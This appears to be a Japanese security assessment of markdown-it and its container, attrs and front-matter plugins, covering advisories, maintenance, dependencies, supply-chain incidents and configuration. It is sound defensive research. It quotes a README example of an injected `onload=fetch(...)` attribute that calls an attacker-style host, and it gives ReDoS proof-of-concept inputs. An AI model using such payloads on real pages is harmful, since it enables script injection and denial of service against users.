# markdown-it と関連プラグイン（container / attrs / front-matter）のセキュリティ状況（2026年10月14日時点）

調査日: 2026-10-14。npm レジストリ JSON、GitHub Advisory Database（API）、OSV.dev（API）、各リポジトリの CHANGELOG / README / 公開ソース（unpkg）、セキュリティベンダーの記事を参照した。パッケージのインストールや実行は一切していない。依存ツリーの件数は、レジストリのメタデータに対して簡易 semver リゾルバを当てて算出したもの（最新の該当バージョンに解決。npm の実際のロックファイルとはわずかにずれる可能性がある）。

---

## Q1. CVE / GHSA の履歴（影響バージョン・修正バージョン・2026年10月時点で未修正のもの）

### Takeaway
markdown-it 本体の勧告は 5 件で、すべて DoS 系（ReDoS / 二次計算量）。XSS やプロトタイプ汚染は 1 件もない。どれも修正版があり、15.0.2 または 14.3.2 を使えば既知の勧告はすべて塞がる。markdown-it-container、markdown-it-attrs、markdown-it-front-matter、gray-matter には GHSA・OSV ともに勧告が 0 件。ただし gray-matter の推移的依存である sprintf-js（js-yaml 3 → argparse 1 経由）には、2026年9月公開で修正版のない DoS 勧告 CVE-2026-97058 がある。

### Cited Findings
**markdown-it（GHSA 5件。OSV も同じ5件）**
- GHSA-253c-mchw-3w2r（CVE 未採番、Medium、2026-09-29 公開）: `linkify: true` のときに二次計算量になる経路が 2 つある（core linkify の `arrayReplaceAt` と、inline linkify の `SCHEME_RE` 再走査）。影響は `= 15.0.0` と `< 14.3.1`、修正は 15.0.1 と 14.3.1。PoC では `'a@b.co\n'.repeat(40000)`（約273KB）が 89 秒かかった。`linkify: false` なら同じ入力が 25〜131ms で済む — [GitHub Advisory GHSA-253c-mchw-3w2r](https://github.com/advisories/GHSA-253c-mchw-3w2r)
- GHSA-6v5v-wf23-fmfq / CVE-2026-48988（Medium、CVSS 5.3、2026-06-15 公開）: `typographer: true` 時の smartquotes ルールで `replaceAt()` が二次計算量になる DoS。影響は `<= 14.1.1`、修正は 14.2.0 — [GHSA-6v5v-wf23-fmfq](https://github.com/advisories/GHSA-6v5v-wf23-fmfq)
- GHSA-38c4-r59v-3vqw / CVE-2026-2327（Medium、CVSS 5.3、2026-02-12 公開）: linkify 処理の正規表現 `/\*+$/` による ReDoS。影響は `>= 13.0.0, < 14.1.1`、修正は 14.1.1 — [GHSA-38c4-r59v-3vqw](https://github.com/advisories/GHSA-38c4-r59v-3vqw)
- GHSA-6vfc-qv3f-vr6c / CVE-2022-21670（Medium、2022-01-12 公開、古い）: newline ルールの ReDoS（Uncontrolled Resource Consumption）。影響は `< 12.3.2`、修正は 12.3.2 — [GHSA-6vfc-qv3f-vr6c](https://github.com/advisories/GHSA-6vfc-qv3f-vr6c), [CHANGELOG 12.3.2「Fix possible ReDOS in newline rule」](https://github.com/markdown-it/markdown-it/blob/master/CHANGELOG.md)
- GHSA-j5p7-jf4q-742q / CVE-2015-10005（High、2022-12-27 公開、非常に古い）: 正規表現の非効率。影響は `< 3.0.0`、修正は 3.0.0 — [GHSA-j5p7-jf4q-742q](https://github.com/advisories/GHSA-j5p7-jf4q-742q)
- 同じ一覧を OSV でも確認した（5件、範囲も同じ） — [OSV query: markdown-it](https://osv.dev/list?ecosystem=npm&q=markdown-it)
- GHSA にはないが CHANGELOG に「Security」と書かれた修正: 15.0.2（2026-09-11）「quote types が一致しない場合の smartquotes の二次計算量を修正（#1209）。未対応の開き引用符のスタックを 1000 に制限」。13.0.2（2023-09-26）「linkify inline rule による crash/無限ループを修正（#957）」。14.1.0（2024-03-19）「参照パースの二次計算量（#996）、テーブルの出力サイズの二次増大（#1000）を修正」 — [markdown-it CHANGELOG](https://github.com/markdown-it/markdown-it/blob/master/CHANGELOG.md)
- 日付の食い違い: CHANGELOG では 14.1.1 が「2026-01-11」だが、npm の公開時刻は 2026-02-11T。GHSA の公開は 2026-02-12 — [CHANGELOG](https://github.com/markdown-it/markdown-it/blob/master/CHANGELOG.md), [registry.npmjs.org/markdown-it](https://registry.npmjs.org/markdown-it)

**markdown-it の直接依存**
- linkify-it: 2件。いずれも High、CVSS 7.5（GHSA-v245-v573-v5vm の CVSS は記載あり）。
  - GHSA-22p9-wv53-3rq4 / CVE-2026-48801（2026-06-26 公開）: `LinkifyIt#match` の走査ループが O(N²)。影響は `<= 5.0.0`、修正は 5.0.1。64KB の `"a@b.com\n"` 繰り返しで約2.5秒かかり、`markdown-it`（`linkify:true`）からもそのまま到達する — [GHSA-22p9-wv53-3rq4](https://github.com/advisories/GHSA-22p9-wv53-3rq4)
  - GHSA-v245-v573-v5vm / CVE-2026-59887（2026-07-21 公開）: `mailto:` バリデータの走査が二次計算量になる DoS。影響は `<= 5.0.1`、修正は 5.0.2 — [GHSA-v245-v573-v5vm](https://github.com/advisories/GHSA-v245-v573-v5vm)
- entities / mdurl / uc.micro / punycode.js / argparse: GHSA・OSV ともに 0 件 — [GitHub Advisory DB 検索結果（API: affects=…）](https://github.com/advisories?query=ecosystem%3Anpm), [OSV.dev](https://osv.dev/)

**プラグイン・front matter 関連**
- markdown-it-container / markdown-it-attrs / markdown-it-front-matter / gray-matter: GHSA・OSV ともに 0 件 — [GitHub Advisory Database](https://github.com/advisories), [OSV.dev](https://osv.dev/)
- Snyk でも markdown-it-attrs の脆弱性は 0 件で、最新 5.0.1 について「No vulnerabilities found in the latest version」と表示される — [Snyk: markdown-it-attrs](https://security.snyk.io/package/npm/markdown-it-attrs)
- markdown-it-attrs の属性注入（onclick 等）は CVE ではなく、README で「仕様上可能。allowlist で防げ」と説明されている（詳細は Q5） — [markdown-it-attrs README](https://github.com/arve0/markdown-it-attrs/blob/master/README.md)
- js-yaml（gray-matter が `^3.13.1` で依存。markdown-it-front-matter と組み合わせる場合も候補になる）: GHSA 12件。2025〜2026年の主なもの:
  - CVE-2025-64718（2025-11-14）: merge `<<` でのプロトタイプ汚染。修正は 4.1.1 / 3.14.2
  - CVE-2026-53550（2026-06-15）: merge key の二次計算量。修正は 4.2.0 / 3.15.0
  - CVE-2026-59869（2026-07-20、High）: 修正は 3.15.0 / 4.3.0
  - CVE-2026-59868 / CVE-2026-59870（2026-07-20、5.x 系）: 修正は 5.2.0 / 5.2.1
  - CVE-2026-73643（2026-07-24、5.x の flow collection で指数時間）: 修正は 5.2.2
  - GHSA-5p4m-2wfm-xmqj（2026-08-06、!!omap の 3.x/4.x 向けバックポート）: 修正は 4.3.1 / 3.15.1
  - CVE-2026-84375 / GHSA-2883-xcg3-v3hh（2026-09-08、High、CVSS 7.5）: `maxTotalMergeKeys` が空マッピングを数えない。影響は `>=3.0.0 <3.15.2` と `>=4.0.0 <4.3.2`、修正は 3.15.2 / 4.3.2
  - GHSA-r3ph-w7gj-g6xm（2026-09-29、5.x）: 影響は `>=5.0.0 <=5.4.0`、修正は 5.4.1
  - 古いもの: GHSA-8j8c-7jfh-h6hx「Code Injection」（< 3.13.1、2019年）、CVE-2013-4660（< 2.0.5）
  - 出典 — [GHSA-2883-xcg3-v3hh](https://github.com/advisories/GHSA-2883-xcg3-v3hh), [GHSA-r3ph-w7gj-g6xm](https://github.com/advisories/GHSA-r3ph-w7gj-g6xm), [GHSA-mh29-5h37-fv8m](https://github.com/advisories/GHSA-mh29-5h37-fv8m), [GHSA-52cp-r559-cp3m](https://github.com/advisories/GHSA-52cp-r559-cp3m), [GHSA-8j8c-7jfh-h6hx](https://github.com/advisories/GHSA-8j8c-7jfh-h6hx)
  - GHSA-2883-xcg3-v3hh には「v3 と v4 では merge がデフォルトで有効なので深刻度が高い」と書かれている — [GHSA-2883-xcg3-v3hh](https://github.com/advisories/GHSA-2883-xcg3-v3hh)
- kind-of（gray-matter の依存）: CVE-2019-20149（Validation Bypass）。影響は `>=6.0.0 <6.0.3`、修正は 6.0.3（2020年）。現在の解決先は 6.0.3 — [GHSA-6c8f-qphg-qjgp](https://github.com/advisories/GHSA-6c8f-qphg-qjgp)
- **未修正のもの**: sprintf-js の GHSA-hp3w-g68c-fv3c / CVE-2026-97058（Moderate、CWE-1284）。NVD 公開は 2026-09-24、GitHub のレビューは 2026-10-05。範囲は「introduced 0, last_affected 1.1.3」で、修正版はない。内容は「書式文字列を攻撃者が制御できる場合、精度指定子が未検証のため RangeError で処理が中断される」というもの。gray-matter@4.0.3 → js-yaml@3.15.2 → argparse@1.0.10 → sprintf-js@1.0.3 の経路で入る — [OSV GHSA-hp3w-g68c-fv3c](https://osv.dev/vulnerability/GHSA-hp3w-g68c-fv3c), [NVD CVE-2026-97058](https://nvd.nist.gov/vuln/detail/CVE-2026-97058)

**比較対象**
- marked: GHSA は 18件（うち4件は withdrawn）。大半は 0.3.x〜4.0.10 時代の XSS / ReDoS（2014〜2022年）。最新のものは CVE-2026-41680 / GHSA-6v9c-7cg6-27q7（High、2026-04-29）: Tokenizer の無限再帰による OOM DoS。影響は `>=18.0.0 <=18.0.1`、修正は 18.0.2 — [GHSA-6v9c-7cg6-27q7](https://github.com/advisories/GHSA-6v9c-7cg6-27q7), [GHSA-5v2h-r2cx-5xgj（CVE-2022-21681）](https://github.com/advisories/GHSA-5v2h-r2cx-5xgj)
- micromark / remark-parse / unified / mdast-util-from-markdown: GHSA・OSV ともに 0 件 — [OSV.dev](https://osv.dev/)
- unified 系の HTML 変換層:
  - remark-html: CVE-2021-39199「Unsafe defaults」（Critical）。修正は 13.0.2 / 14.0.1 — [GHSA-9q5w-79cv-947m](https://github.com/advisories/GHSA-9q5w-79cv-947m)
  - mdast-util-to-hast: CVE-2025-66400「unsanitized class attribute」（2025-12-02）。影響は `>=13.0.0 <13.2.1`、修正は 13.2.1 — [OSV GHSA-4fh9-h7wg-q85m](https://osv.dev/vulnerability/GHSA-4fh9-h7wg-q85m)

### Inferences
- markdown-it 系で 2026年に勧告が集中した（2月・6月・7月・9月）のは、AI 支援による脆弱性探索で二次計算量バグがまとめて報告された流れと見られる（勧告本文の PoC はいずれも計算量の解析が中心）。いずれも修正済みで、メンテナの対応は速い（GHSA-253c は 15.0.0 公開から約1か月後の 15.0.1 で修正）。
- このプロジェクトの入力は作者自身の Markdown だけで、処理もローカル CLI で完結する。そのため DoS 系の勧告の実害は、最悪でも「自分のビルドが遅くなる」程度。ただし `npm audit` などのスキャナは警告を出すので、15.0.2 以上（14 系なら 14.3.2 以上）に固定しておくのが無難。
- sprintf-js の CVE-2026-97058 は、書式文字列を攻撃者が制御できることが前提。argparse 1.x は CLI ヘルプの整形にしか使っていないはずなので、gray-matter 経由で実害が出る可能性はほぼない。それでも未修正のまま監査ツールに残り続けるので、gray-matter を避ける理由の一つになる。

### Gaps
- markdown-it 15.0.2 で修正された smartquotes の二次計算量（#1209）に対応する GHSA は見つからなかった（勧告なしで修正されたか、まだ公開されていないかは不明）。14.3.2（2026-09-12）にバックポートされたかも、v14 系の CHANGELOG を確認できなかったため未検証。
- GHSA-253c-mchw-3w2r には CVE ID がなかった（2026-10-14 時点）。
- GitHub API の未認証レート制限に達したため、debug の GHSA（GHSA-4x49-vf9v-38px）の本文は OSV の要約でしか確認していない。

---

## Q2. 最新バージョン・リリース日・メンテナンス状況（放棄リスク）

### Takeaway
markdown-it 本体と直接依存（linkify-it、mdurl、uc.micro、argparse）は、2026年に入ってから非常に活発にリリースされている（15.0.0 が 2026-07-30、15.0.2 が 2026-09-11。v14-legacy 系も並行保守）。ただし npm 上のメンテナは vitaly 1人。markdown-it-attrs は作者が「機能的には完成。バグ修正とセキュリティ更新のみ」と明言していて、2026年5〜7月に5回リリースがあった。markdown-it-container は 2023-12 の 4.0.0 以降リリースがない。とはいえ依存ゼロ・約20KBの小さなプラグインで、放棄というより安定状態と見るのが妥当。markdown-it-front-matter は 2024-04 以降停止している。gray-matter は 2021-04 以降リリースがなく、未対応 issue が 81 件あって、停滞リスクが最も高い。

### Cited Findings
**バージョンとリリース日（npm レジストリ）**
- markdown-it: latest 15.0.2（2026-09-11）、dist-tag `v14-legacy` は 14.3.2（2026-09-12）。2026年のリリースは 14.1.1（02-11）、14.2.0（05-23）、14.3.0（07-02）、15.0.0（07-30）、14.3.1 と 15.0.1（08-27）、15.0.2（09-11）、14.3.2（09-12）。npm メンテナは `vitaly` のみ — [registry.npmjs.org/markdown-it](https://registry.npmjs.org/markdown-it)
- markdown-it 15.0.0 の主な変更（2026-07-30）:
  - TypeScript 化、型定義の同梱、ESM/CJS のビルド済み配布
  - `markdown-it/lib/*` などの内部 subpath exports を削除（破壊的変更）
  - linkify-it v6（「No fuzzy links by default」「Unicode 句読点でリンクを終端。CJK 向けの改善」）
  - entities v8
  - `validateLink` / `normalizeLink` / `normalizeLinkText` をプロパティから prototype メソッドに移動
  - 出典 — [CHANGELOG 15.0.0](https://github.com/markdown-it/markdown-it/blob/master/CHANGELOG.md)
- linkify-it: 6.1.0（2026-07-22）。2026年は 5.0.1（05-23）、5.0.2（07-01）、6.0.0（07-11）。メンテナは vitaly — [registry.npmjs.org/linkify-it](https://registry.npmjs.org/linkify-it)
- entities: 8.1.0（2026-09-07）。メンテナは fb55。8.0.0 以降は GitHub Actions からの trusted publishing。engines は `node >=20.19.0` — [registry.npmjs.org/entities](https://registry.npmjs.org/entities)
- mdurl: 2.1.0（2026-07-22） — [registry](https://registry.npmjs.org/mdurl)
- uc.micro: 3.0.0（2026-07-22） — [registry](https://registry.npmjs.org/uc.micro)
- argparse: 3.0.2（2026-09-10）。2.0.1（2020）から6年ぶりのメジャー更新で、ライセンスは PSF-2.0 — [registry](https://registry.npmjs.org/argparse)
- punycode.js: 2.3.1（2023-10-30）。メンテナは mathias と google-wombot — [registry](https://registry.npmjs.org/punycode.js)
- markdown-it-container: 4.0.0（2023-12-05）。全4版（1.0.0 は 2015、2.0.0 は 2015、3.0.0 は 2020、4.0.0 は 2023）。メンテナは vitaly — [registry](https://registry.npmjs.org/markdown-it-container)。デフォルトブランチの最終コミットは 2023-12-05「4.0.0 released」 — [GitHub commits](https://github.com/markdown-it/markdown-it-container/commits)。リポジトリの pushed_at は 2026-07-14、open issues は 2、archived ではない — [GitHub API repos/markdown-it/markdown-it-container](https://api.github.com/repos/markdown-it/markdown-it-container)
- markdown-it-attrs:
  - リリース: 5.0.1（npm 公開 2026-07-27、GitHub Release は 2026-07-28）。2026年は 4.3.2・4.4.0・4.5.0（いずれも 05-20）と 5.0.0（05-26）。npm メンテナは arve0 のみ。peerDependencies は `markdown-it >= 9.0.0` — [registry](https://registry.npmjs.org/markdown-it-attrs), [GitHub Releases](https://github.com/arve0/markdown-it-attrs/releases)
  - リポジトリ: pushed_at は 2026-10-04、open issues 9、stars 333、archived ではない — [GitHub API](https://api.github.com/repos/arve0/markdown-it-attrs)
  - README:「Library is considered done from my part. I'm maintaining it with bug fixes and security updates.」 — [README](https://github.com/arve0/markdown-it-attrs/blob/master/README.md)
  - 2026年5月のリリースに含まれる PR のうち複数（#167、#168、#170、#171）の作成者は「@Copilot」 — [GitHub Releases](https://github.com/arve0/markdown-it-attrs/releases)
- markdown-it-front-matter: 0.2.4（2024-04-04）。メンテナは craigdmckenna と parksb。リポジトリの pushed_at は 2024-06-16、open issues 1 — [registry](https://registry.npmjs.org/markdown-it-front-matter), [GitHub API](https://api.github.com/repos/parksb/markdown-it-front-matter)
- gray-matter: 4.0.3（2021-04-24）。メンテナは jonschlinkert、doowb、rmassaioli。リポジトリの pushed_at は 2025-06-14、open issues 81 — [registry](https://registry.npmjs.org/gray-matter), [GitHub API](https://api.github.com/repos/jonschlinkert/gray-matter)
- js-yaml: 5.4.3（2026-10-05）。dist-tag は `v4-legacy` 4.3.2 と `v3-legacy` 3.15.2（いずれも 2026-08-26）。メンテナは vitaly（markdown-it と同じ人物） — [registry](https://registry.npmjs.org/js-yaml)
- markdown-it 本体のリポジトリ: pushed_at は 2026-09-12、open issues（PR を含む）14、stars 21,981 — [GitHub API](https://api.github.com/repos/markdown-it/markdown-it)
- 比較対象:
  - marked: 18.1.1（2026-10-12）。メンテナ 4人、trusted publishing — [registry](https://registry.npmjs.org/marked)
  - micromark: 4.0.3（2026-09-26）。メンテナは wooorm 1人 — [registry](https://registry.npmjs.org/micromark)
  - remark-parse: 11.0.0（2023-09-18） — [registry](https://registry.npmjs.org/remark-parse)
  - unified: 11.0.5（2024-06-19） — [registry](https://registry.npmjs.org/unified)

### Inferences
- markdown-it のエコシステム（本体・linkify-it・mdurl・uc.micro・argparse・js-yaml・markdown-it-container）は、npm 上ではすべて vitaly という単一アカウントに依存している。保守は活発だが、バス係数とアカウント乗っ取りの観点では 1 アカウント = 単一障害点。
- markdown-it-container は約20KB・依存ゼロ・API も単純なので、リリースが止まっていても実害は小さい。15.0.0 で内部 subpath exports が削除されたが、container は `md.block.ruler` などの公開 API で動くはずなので互換性への影響は小さい（未検証）。
- markdown-it-attrs は「完成済み・保守のみ」の状態で、2026年にも修正リリースがあるので、当面放棄のリスクは低い。ただし単一メンテナで、AI エージェント（Copilot）による PR の取り込みが増えている点は、レビューの質の面で注意しておく。

### Gaps
- markdown-it-container の pushed_at（2026-07-14）がデフォルトブランチ外の push（dependabot 等）なのかは確認していない。
- 各リポジトリで、GitHub Security タブの非公開勧告（draft）が開かれているかは外部から確認できない。

---

## Q3. 推移的依存の数とインストールスクリプト

### Takeaway
markdown-it@15.0.2 の推移的依存は 6 パッケージ（合計 7）。container / attrs / front-matter はいずれも依存ゼロ。gray-matter は 9 パッケージを追加し、その中には古い js-yaml 3.x、argparse 1.x、未修正 CVE のある sprintf-js が含まれる。解決されたすべてのパッケージの最新マニフェストに、preinstall / install / postinstall スクリプトはない。比較対象では、marked が依存ゼロ、micromark が 28、remark が 51、unified + remark-parse + remark-rehype + rehype-stringify のパイプラインが約 63 パッケージ。

### Cited Findings
- markdown-it@15.0.2 の依存（resolve 結果）: argparse@3.0.2、entities@8.1.0、linkify-it@6.1.0（→ uc.micro）、mdurl@2.1.0、punycode.js@2.3.1、uc.micro@3.0.0。合計 7 パッケージで、npm メンテナアカウントは 4 つ（vitaly、fb55、mathias、google-wombot） — [registry.npmjs.org/markdown-it](https://registry.npmjs.org/markdown-it), [registry.npmjs.org/linkify-it](https://registry.npmjs.org/linkify-it)
- markdown-it@14.3.2（v14-legacy）: argparse@2.0.1、entities@4.5.0、linkify-it@5.0.2、mdurl@2.1.0、punycode.js@2.3.1、uc.micro@2.1.0。こちらも合計 7 — [registry.npmjs.org/markdown-it](https://registry.npmjs.org/markdown-it)
- argparse は markdown-it の CLI 用（15.0.0 の CHANGELOG に「Added colored CLI help on supported terminals via `argparse` 3」） — [CHANGELOG](https://github.com/markdown-it/markdown-it/blob/master/CHANGELOG.md)
- markdown-it-container@4.0.0、markdown-it-attrs@5.0.1、markdown-it-front-matter@0.2.4 は dependencies なし（attrs は peerDependencies のみ） — [registry: container](https://registry.npmjs.org/markdown-it-container), [registry: attrs](https://registry.npmjs.org/markdown-it-attrs), [registry: front-matter](https://registry.npmjs.org/markdown-it-front-matter)
- gray-matter@4.0.3 の依存（合計10）:
  - 直接: js-yaml `^3.13.1`（→ 3.15.2）、kind-of `^6.0.2`（→ 6.0.3）、section-matter（→ extend-shallow@2.0.1 → is-extendable@0.1.1、kind-of）、strip-bom-string@1.0.0
  - js-yaml@3.15.2 経由: argparse@1.0.10 → sprintf-js@1.0.3、esprima@4.0.1
  - 関わるメンテナアカウントは 7
  - 出典 — [registry: gray-matter](https://registry.npmjs.org/gray-matter), [registry: js-yaml](https://registry.npmjs.org/js-yaml), [registry: section-matter](https://registry.npmjs.org/section-matter)
- js-yaml@5.4.3 単体: argparse `^2.0.1` のみ（合計2） — [registry: js-yaml](https://registry.npmjs.org/js-yaml)
- インストールスクリプト: 上記すべてのツリー（markdown-it 15/14、各プラグイン、gray-matter、js-yaml、marked、micromark、remark 系）の解決後バージョンについて、マニフェストの `scripts` に preinstall / install / postinstall はなく、`hasInstallScript` もなかった — [npm registry metadata（各パッケージ）](https://registry.npmjs.org/markdown-it)
- 比較対象:
  - marked@18.1.1: dependencies なし（合計1） — [registry: marked](https://registry.npmjs.org/marked)
  - micromark@4.0.3: 合計29（debug@4.4.3、ms@2.1.3、@types/debug、micromark-util-* 多数を含む）。メンテナアカウント 11 — [registry: micromark](https://registry.npmjs.org/micromark)
  - remark-parse@11.0.0: 合計43。remark@15.0.1: 合計52（いずれもメンテナアカウント 17） — [registry: remark-parse](https://registry.npmjs.org/remark-parse), [registry: remark](https://registry.npmjs.org/remark)
  - unified + remark-parse + remark-rehype + rehype-stringify の和集合: 約63（簡易リゾルバによる算出） — [registry: remark-rehype](https://registry.npmjs.org/remark-rehype), [registry: rehype-stringify](https://registry.npmjs.org/rehype-stringify)

### Inferences
- 「markdown-it + container + attrs + front-matter + js-yaml 5」という構成なら、合計 10 パッケージ程度（markdown-it 7、プラグイン 3、js-yaml 5.4.3 と argparse 2.0.1 を追加）で、ほぼすべてが vitaly / fb55 / mathias / arve0 / parksb の管理下に収まる。供給網の攻撃面は unified 系（約63）よりかなり小さい。
- 同じ front matter 用途でも、gray-matter は js-yaml 3.x（DoS 勧告の多い legacy 系）と未修正の sprintf-js を持ち込む。依存の観点では「markdown-it-front-matter + js-yaml 5.x」のほうが明らかに軽い。

### Gaps
- 依存件数は簡易リゾルバによる推定。npm が実際に生成するロックファイルとの完全な一致は検証していない（パッケージのインストールは禁止条件のため）。
- ここで確認したのは「現在の最新版」のインストールスクリプトの有無だけ。過去に悪性版が公開されたかは Q4 で OSV を照合した。

---

## Q4. 2025〜2026年の npm 供給網インシデントへの関与

### Takeaway
OSV の悪性パッケージ（MAL-*）データベースを照合した限り、markdown-it 本体、全直接依存、container / attrs / front-matter、gray-matter とその依存に、悪性版が公開された記録はない。主要な事件（2025-09 の chalk/debug、2025-09 と 2025-11 の Shai-Hulud、2026年の axios・TanStack・@antv・Red Hat・AsyncAPI・keyv/ChainDrop）の公開リストにも、これらのパッケージ名は見当たらない。一方、比較対象の micromark は `debug ^4.0.0` に依存していて、2025-09-08 に乗っ取られた debug@4.4.2 は semver 上その範囲に入る。

### Cited Findings
- OSV で markdown-it、entities、linkify-it、mdurl、uc.micro、punycode.js、argparse、markdown-it-container、markdown-it-attrs、markdown-it-front-matter、gray-matter、js-yaml、kind-of、section-matter、strip-bom-string、extend-shallow、is-extendable、esprima、sprintf-js を照会した結果、MAL-* や「contains malware」系のエントリは 0 件 — [OSV.dev](https://osv.dev/list?ecosystem=npm)
- debug@4.4.2 は悪性版として登録されている: MAL-2025-46974（2025-09-08）と GHSA-4x49-vf9v-38px「debug@4.4.2 contains malware after npm account takeover」（2025-09-15） — [OSV MAL-2025-46974](https://osv.dev/vulnerability/MAL-2025-46974), [OSV GHSA-4x49-vf9v-38px](https://osv.dev/vulnerability/GHSA-4x49-vf9v-38px)
- 2025-09-08 の chalk/debug 事件: メンテナ Qix のアカウントが偽の 2FA リセットメール（npmjs.help ドメイン）によるフィッシングで乗っ取られ、chalk、debug、ansi-styles、supports-color などの悪性版が公開された（影響件数は資料により 18〜25 件）。暗号資産ウォレットを狙うペイロードで、数時間以内に削除された — [Endor Labs](https://endorlabs.com/learn/major-supply-chain-attack-compromises-popular-npm-packages-including-chalk-and-debug), [Wiz](https://www.wiz.io/it-it/blog/widespread-npm-supply-chain-attack-breaking-down-impact-scope-across-debug-chalk)
- micromark@4.0.3 の dependencies に `debug: ^4.0.0` がある（4.4.2 はこの範囲に入る） — [registry: micromark](https://registry.npmjs.org/micromark)
- Shai-Hulud 2.0（悪性パッケージのアップロードは 2025-11-21〜23）: preinstall（`setup_bun.js`）で Bun を導入し、認証情報を窃取して GitHub に流出させた。影響リポジトリは 25,000 超、被害者に Zapier・ENS・PostHog・Postman — [Wiz: Shai-Hulud 2.0](https://www.wiz.io/blog/shai-hulud-2-0-ongoing-supply-chain-attack), [The Register](https://www.theregister.com/2025/11/24/shai_hulud_npm_worm/)
- Shai-Hulud 2.0 で「markdown-it」を名前に含むパッケージとして感染したのは、無関係のサードパーティ製 `@accordproject/markdown-it-cicero`（2025-11-24 開始のキャンペーン、preinstall で実行）。markdown-it 本体ではない — [GitLab Advisory: @accordproject/markdown-it-cicero](https://advisories.gitlab.com/pkg/npm/@accordproject/markdown-it-cicero/)
- 2026年の事件（Unit 42、2026-07-15 更新）:
  - @bitwarden/cli（04-22）
  - SAP CAP/MTA（04-29、OIDC trusted publisher のスコープ設定ミス）
  - TanStack（05-11、42 パッケージ → 当日中に 169 パッケージ・373 版、正規の SLSA provenance 付き）
  - @antv（05-19、323 パッケージ・639 版）
  - Red Hat @redhat-cloud-services（06-01、少なくとも 32 パッケージ、正規の provenance 付き）
  - AsyncAPI（07-14、5 パッケージ）
  - いずれの一覧にも markdown-it 系の名前はない
  - 出典 — [Unit 42: npm Threat Landscape](https://unit42.paloaltonetworks.com/monitoring-npm-supply-chain-attacks/)
- axios（2026年3月）: メンテナアカウントの乗っ取りで悪性版が公開され、CISA がアラートを出した — [CISA Alert 2026-04-20](https://www.cisa.gov/news-events/alerts/2026/04/20/supply-chain-compromise-impacts-axios-node-package-manager)
- Red Hat @redhat-cloud-services の侵害 — [Red Hat RHSB-2026-006](https://access.redhat.com/security/vulnerabilities/RHSB-2026-006)
- keyv / 「Mini Shai-Hulud」（2026-08-04）:
  - 経緯: メンテナの GitHub アカウントが侵害された。「poisoned versions were published to npm with valid provenance signed by GitHub Actions」
  - 規模: 08-05 時点で少なくとも 444 パッケージ・1,381 版
  - ペイロード: `"preinstall": "node setup.mjs"` から Bun 経由で実行。`.claude/settings.json` や `.vscode/tasks.json` にフックを仕込む
  - 一覧に markdown 系のパッケージ名はない
  - 出典 — [Aikido: keyv and friends compromised](https://www.aikido.dev/blog/keyv-and-friends-compromised-in-npm-supply-chain-attack)

### Inferences
- markdown-it 系を採用する場合、過去の悪性版にさらされた経路は確認されていない。unified 系（micromark 経由で debug を含む約63パッケージ）を採用していた場合は、2025-09-08 の数時間にロックファイルなしで新規インストールすると debug@4.4.2 を引いた可能性がある（理論上の露出）。
- 2026年の事件の主な手口は「メンテナアカウント / CI の乗っ取り」と「preinstall フック」。markdown-it 系は単一アカウント（vitaly）への集中度が高いので、ロックファイルの固定、`ignore-scripts=true`、新しい版を入れるまでに 24〜72 時間の待機期間を置くこと（Unit 42 の推奨）が、主な防御策になる。

### Gaps
- 2025年9月の第1波 Shai-Hulud（@ctrl/tinycolor など約500パッケージ）の完全な一覧と、本調査対象との突き合わせは一次資料で確認できていない（OSV の MAL 照合で代替した）。
- 2026年8月以降（ChainDrop 以降）の事件で、ここで挙げた以外のものは網羅できていない。

---

## Q5. このユースケース（作者本人のみが入力するオフライン単一 HTML）で重要な設定

### Takeaway
markdown-it のデフォルトは `html: false`、`linkify: false`、`typographer: false` で、`validateLink` が `javascript:` / `vbscript:` / `file:` / `data:`（gif/png/jpeg/webp の画像を除く）を拒否する。`html: true` は公式に「外部サニタイザと併用する」戦略とされているが、入力が作者本人に限られるなら許容できる。注意が要るのは markdown-it-attrs。`allowedAttributes` のデフォルトは `[]`（= 全属性許可）なので、`html: false` でも `{onclick=...}` や `{onload=...}` が通る。README 自身が allowlist の使用を推奨している。

### Cited Findings
- デフォルトプリセット: `html: false`、`linkify: false`、`typographer: false` — [markdown-it src/presets/default.ts](https://github.com/markdown-it/markdown-it/blob/master/src/presets/default.ts)
- validateLink の実装: `BAD_PROTO_RE = /^(vbscript|javascript|file|data):/`、`GOOD_DATA_RE = /^data:image\/(gif|png|jpeg|webp);/`。`return BAD_PROTO_RE.test(str) ? GOOD_DATA_RE.test(str) : true` — [markdown-it src/markdownit.ts](https://github.com/markdown-it/markdown-it/blob/master/src/markdownit.ts)
- 15.0.0 で `validateLink` / `normalizeLink` / `normalizeLinkText` が prototype メソッドに移動した — [CHANGELOG 15.0.0](https://github.com/markdown-it/markdown-it/blob/master/CHANGELOG.md)
- 公式の Safety ドキュメント:
  - 安全な出力を得る戦略は2つ。「1. HTML を有効にせず、プラグインで拡張する（デフォルト。サニタイザ不要）」と「2. HTML を有効にして外部サニタイザを使う」
  - プラグインについて:「don't allow plugins to generate arbitrary element `id` and `name`」（DOM clobbering 対策）。「extended class syntax」系のプラグインには注意せよ
  - 出典 — [markdown-it docs/safety.md](https://github.com/markdown-it/markdown-it/blob/master/docs/safety.md)
- linkify: 15.0.0 で linkify-it v6 になり「No fuzzy links by default」「No auth part check by default」。過去の DoS 勧告（CVE-2026-2327、GHSA-253c、CVE-2026-48801、CVE-2026-59887）はいずれも `linkify: true` が前提 — [CHANGELOG 15.0.0](https://github.com/markdown-it/markdown-it/blob/master/CHANGELOG.md), [GHSA-253c-mchw-3w2r](https://github.com/advisories/GHSA-253c-mchw-3w2r)
- typographer: CVE-2026-48988 は `typographer: true` 時の smartquotes で起きる — [GHSA-6v5v-wf23-fmfq](https://github.com/advisories/GHSA-6v5v-wf23-fmfq)
- markdown-it-attrs の Security 節:
  - 「A user may insert rogue attributes like this: `![](img.png){onload=fetch('https://imstealingyourpasswords.com/script.js')...}`」
  - 対策は「If security is a concern, use an attribute whitelist: `allowedAttributes: ['id', 'class', /^regex.*$/]`」
  - Usage 例のデフォルトは `allowedAttributes: []  // empty array = all attributes are allowed`
  - 出典 — [markdown-it-attrs README](https://github.com/arve0/markdown-it-attrs/blob/master/README.md)
- markdown-it-attrs@5.0.1 のデフォルトオプション: `allowedAttributes: []`、`allowedAttributeValues: []`、`fenceAttrsOnPre: true`。`allowedAttributeValues`（属性値のフィルタ）は 4.4.0（2026-05-20、PR #160「add ability to filter attribute values」）で追加された — [unpkg markdown-it-attrs@5.0.1/index.js](https://unpkg.com/markdown-it-attrs@5.0.1/index.js), [GitHub Releases v4.4.0](https://github.com/arve0/markdown-it-attrs/releases)
